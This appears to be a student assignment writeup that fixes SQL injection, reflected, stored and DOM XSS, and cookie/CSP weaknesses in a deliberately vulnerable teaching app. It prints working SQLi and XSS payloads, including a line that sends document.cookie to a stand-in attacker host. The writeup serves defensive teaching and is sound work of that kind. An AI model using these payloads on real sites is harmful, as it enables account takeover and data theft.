# WRITEUP — Securing *GreenThumb*

CYSE 411 · Assignment 3 · Units 2.2 (Injection & Input Handling) and 2.3 (XSS)

Each fix is tagged `FIX n` in the source. The app runs with `npm install && npm start`
on port 3000, and `npm run exploit` reports `[SECURE]` for all five with the site
still fully functional (real login, search + sort, comments, and the `#note=` banner
all work). Verified locally: every exploit flipped from `[VULNERABLE]` (starter) to
`[SECURE]` (this build) with **no change to the exploit scripts**.

---

## FIX 1 — SQL injection: authentication bypass (`POST /login`)

**Vulnerable line(s) & why.** The login handler built its query by string
concatenation:

```js
`SELECT id, username FROM users WHERE username = '${username}' AND password = '${password}'`
```

Because the raw `username`/`password` are pasted into the SQL text, the database
engine cannot tell the app's *instructions* from the attacker's *data*. A `'` ends
the username string literal early, and `--` comments out the rest of the line — so
the password check can be deleted from the statement entirely.

**Payload & effect.** Username `curator' --` (password anything) produces:

```
SELECT id, username FROM users WHERE username = 'curator' --' AND password = '...'
```

The `AND password = …` clause is now inside a comment. The query returns the
`curator` row and the app issues a valid session for that account with no password.
(`exploits/01-sqli-login-bypass.mjs` → logs in as `curator`.)

**Fix & why it works.** Parameterized query with bound placeholders:

```js
get(`SELECT id, username FROM users WHERE username = ? AND password = ?`, [username, password])
```

The query text and the values are sent to the engine separately. Bound values are
never parsed as SQL, so `curator' --` becomes a literal string that matches no
username, and the WHERE clause can no longer be subverted.

**Limit.** Parameterization stops *injection*, not weak auth design. It does not fix
the plaintext-password storage (noted below as out-of-scope scaffolding), does not
add rate-limiting/lockout against brute force, and does nothing for logic flaws
elsewhere in the auth flow.

---

## FIX 2 — SQL injection: data extraction via UNION + unsafe `ORDER BY` (`GET /search`)

**Vulnerable line(s) & why.** Both the search term and the sort key were concatenated
into the query:

```js
`... WHERE title LIKE '%${q}%' OR species LIKE '%${q}%' ORDER BY ${sort}`
```

`q` sits inside a string literal, so a `'` breaks out of it and lets an attacker
append a second query. `sort` is worse: it lands in a raw SQL *position* (`ORDER BY`),
so it is not even a value — it is an identifier/expression the attacker controls
directly.

**Payload & effect.** The visible SELECT returns **four** columns, so the injected
`UNION SELECT` must also return four. Search term:

```
zzznomatch%' UNION SELECT id, username, password, 'x' FROM users -- 
```

This closes the `LIKE` string, staples the `users` rows onto the empty result set
(padding the 4th column with the constant `'x'`), and comments out the trailing SQL.
Usernames and passwords render in the results grid. (`exploits/02-sqli-union-dump.mjs`
→ leaks 4 secrets, e.g. `GreenThumb!Root#2024`.)

**The `sort` field specifically.** `?sort=species` and `?sort=title DESC` change the
result order, confirming raw input reaches `ORDER BY`. This field **cannot be fixed by
parameter binding**, because a bound `?` can only stand in for a *value* — you cannot
bind a column name or the `DESC` keyword; those are part of the query's structure,
which is fixed before any values are bound. An attacker can abuse this position to ask
the database yes/no questions: an `ORDER BY` expression that is only *valid* against
certain tables/columns (or that errors vs. succeeds, or reorders vs. not, depending on
a condition) turns sorting into a boolean oracle for blind inference — table/column
existence, and ultimately data, one bit at a time. (Not weaponized here, per the
instructions; risk described only.)

**Fix & why it works.** Two defenses, matched to what each input actually is:
- **Search value:** bind it. `WHERE title LIKE ? OR species LIKE ?` with
  `['%'+q+'%', '%'+q+'%']`. The UNION payload becomes a literal LIKE pattern and
  matches nothing.
- **`ORDER BY`:** an **allow-list**. A fixed map translates the small set of supported
  sort options to known-safe SQL fragments; anything not in the map falls back to a
  safe default. Raw input never reaches the query structure.

**Limit.** Binding + allow-listing close *this* injection, but the allow-list only
protects fields that legitimately have a finite, enumerable set of safe values; it is
not a general escape mechanism, and any future dynamic-identifier feature (e.g.
user-chosen columns) would need its own allow-list. It also does not address
authorization — a legitimately bound query can still return data a user shouldn't see
if access control is missing.

---

## FIX 3 — Reflected XSS (`GET /search`)

**Vulnerable line(s) & why.** The search term was echoed into the results heading
un-encoded:

```js
`<p class="note">Showing results for "${q}"</p>`
```

The browser's HTML parser treats `q` as markup, so any tags the visitor typed become
live elements in the response.

**Payload & effect.** `<img src=x onerror=alert(document.domain)>`. The image fails to
load (`src=x`), which fires the `onerror` handler, which runs the attacker's
JavaScript in the victim's origin. A bare `<script>` injected this way often won't run,
which is why the event-handler payload is used. (`exploits/03-reflected-xss.mjs` →
reflected as live HTML.)

**Fix & why it works.** An `escapeHtml()` helper converts the HTML-significant
characters (`& < > " '`) to their entities before the term is placed in the page, so
the payload is displayed as literal text (`&lt;img …&gt;`) instead of being parsed as a
tag.

**Limit.** Output encoding is *context-specific*: HTML-entity encoding is correct for
an HTML text/attribute context but would not protect a value dropped into a
`<script>` block, an inline event handler, a URL, or a CSS context — each needs its own
encoding. It also does not sanitize rich HTML if the app ever needs to allow some tags.

---

## FIX 4 — Stored XSS (comments) + DOM-based XSS (shared note)

### 4a — Stored XSS (`GET /listing/:id`)

**Vulnerable line(s) & why.** Comment bodies were stored verbatim and concatenated
into every visitor's page without encoding:

```js
`<p class="comment-body">${c.body}</p> ... — ${c.author}`
```

Stored XSS is worse than reflected: the payload is persisted server-side and runs for
**every** neighbour who merely opens the listing — no crafted link or click required.

**Payload & effect.** A comment body of `<img src=x onerror="alert('<MARKER>')">` is
saved and served back as live HTML to all viewers. In a real attack the handler would
be `new Image().src='https://evil.example/c?'+document.cookie`, exfiltrating the
victim's session cookie inside their authenticated session.
(`exploits/04-stored-xss.mjs` → served back as live HTML.)

**Fix & why it works.** Both the comment **body and author** are passed through
`escapeHtml()` on output, so stored markup is rendered as inert text for every visitor.
(Encoding on output is the right default here because comments are plain text; a
library like DOMPurify would be the choice if we wanted to *allow* a safe subset of
HTML such as bold/links while stripping scripts — a trade-off, not needed here.)

**Limit.** Output encoding neutralizes the payload at display time but does not remove
the malicious record from the database, and it must be applied at **every** sink where
that stored value is later used — any one un-encoded output path re-opens the hole.

### 4b — DOM-based XSS (`public/app.js`)

**Vulnerable line(s) & why.** The shared-note feature read the URL fragment and wrote
it into the page with `.innerHTML`:

```js
bannerEl.innerHTML = `<div class="banner">📎 Shared note: ${note}</div>`;
```

`.innerHTML` *parses* its input as HTML. The fragment (`#…`) never leaves the browser,
so this is a pure client-side bug the server never sees.

**Payload & effect.** `http://localhost:3000/listing/1#note=<img src=x onerror=alert('dom-xss')>`
executes in the browser. (Verified manually in the browser; no automated script for
this one, per the assignment.)

**Fix & why it works.** Build the banner element and assign the untrusted note with
`.textContent` (via `document.createElement` + `replaceChildren`). `.textContent` does
**not** parse HTML, so the markup is inserted as literal text and cannot execute.

**Limit.** Using a safe sink fixes *this* flow, but DOM XSS depends on the specific
source→sink pair: any other place client JS routes untrusted data into a dangerous sink
(`innerHTML`, `document.write`, `eval`, `setAttribute` on an event handler, etc.) would
be independently vulnerable and needs the same treatment.

---

## FIX 5 — Cookie hardening + Content-Security-Policy

**Vulnerable line(s) & why.**
- The session cookie was set as `sid=${token}; Path=/` — no `HttpOnly` (so
  `document.cookie` and thus any XSS could read the session id) and no `SameSite`
  (so the browser attached it to cross-site requests, enabling CSRF).
- There was **no** `Content-Security-Policy` header anywhere, so the browser would run
  injected inline scripts and inline event handlers.

**Payload & effect.** `exploits/05-hardening.mjs` logs in with the real curator
password and inspects headers; on the starter it reports missing `HttpOnly`,
`SameSite`, and `CSP`. Combined with FIX 4, the stored payload
`new Image().src='https://evil.example/c?'+document.cookie` would steal the session id.

**Fix & why it works.**
- **Cookie (5a):** `sid=…; Path=/; HttpOnly; SameSite=Strict` (with `Secure` added
  conditionally when the request is over HTTPS, since a `Secure` cookie would be dropped
  on plain-HTTP localhost). `HttpOnly` takes the session id off the table for
  `document.cookie` even if an XSS runs; `SameSite=Strict` stops the cookie riding along
  on cross-site requests.
- **CSP (5b):** a middleware **above the routes** sets, on every response:
  `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'`. With no `'unsafe-inline'`,
  the browser refuses inline scripts and inline event handlers (like an injected
  `onerror=`), so an XSS that slips past encoding still won't execute. This works without
  breaking the site because all JS lives in `/app.js` and all CSS in `/styles.css` — no
  inline script, style, or handlers.

**Limit.** These are **defense-in-depth**, not the primary fix: CSP *mitigates* the
impact of injected scripts but does not remove the injection, and it is only as strong
as the policy (an over-broad `script-src`, a `'unsafe-inline'`, or an exploitable
allowed host weakens it). `HttpOnly`/`SameSite` protect the cookie but do not stop the
XSS itself, and `Secure` provides no benefit until the app is actually served over TLS.

---

## Noted, but intentionally NOT fixed (out of scope)

Passwords are stored in **plaintext** in `db/seed.js`. This is deliberate teaching
scaffolding so the UNION exercise has something to reveal. A real application must store
a slow salted hash (bcrypt/argon2) and never the password itself. Per the assignment,
this is left as-is and only noted here.
